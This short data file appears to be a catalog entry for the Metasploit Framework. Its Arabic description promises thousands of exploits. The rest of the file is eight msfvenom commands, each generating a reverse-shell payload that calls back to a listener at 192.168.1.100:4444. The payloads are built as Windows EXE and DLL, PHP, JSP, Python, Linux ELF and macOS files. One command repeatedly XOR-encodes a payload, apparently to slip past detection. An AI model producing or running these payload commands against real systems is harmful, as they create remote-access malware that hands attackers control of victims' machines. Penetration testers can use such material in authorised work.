name: Metasploit Framework
description: أقوى إطار عمل لاختبار الاختراق مع آلاف الاستغلالات

commands.title: Payload Windows EXE
commands.cmd: msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f exe -o shell.exe

commands.title: Payload PHP
commands.cmd: msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f raw -o shell.php

commands.title: Payload JSP
commands.cmd: msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f raw -o shell.jsp

commands.title: Payload Python
commands.cmd: msfvenom -p python/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f raw -o shell.py

commands.title: Payload Linux ELF
commands.cmd: msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f elf -o shell.elf

commands.title: Payload macOS
commands.cmd: msfvenom -p osx/x64/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f macho -o shell.macho

commands.title: Payload DLL
commands.cmd: msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f dll -o evil.dll

commands.title: Encoding Payload
commands.cmd: msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -e x64/xor_dynamic -i 5 -f exe -o encoded.exe
